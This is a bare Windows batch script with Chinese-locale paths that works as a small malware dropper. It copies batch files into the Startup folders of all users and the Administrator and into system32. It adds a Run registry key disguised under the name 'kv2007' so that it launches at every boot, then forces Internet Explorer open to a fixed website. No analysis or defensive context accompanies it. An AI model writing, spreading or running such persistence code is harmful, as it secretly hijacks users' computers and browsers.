@echo off
copy "3.bat" "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\"
copy "3.bat" "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\"
copy "3.bat" "C:\WINDOWS\system32\3.bat"
copy %0 %windir%\system32\4.bat
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v kv2007 /t REG_SZ /d %windir%\system32\4.bat /f
set ip=http://www.haokucn.com
start "" "%programfiles%\Internet Explorer\IEXPLORE.EXE" %IP%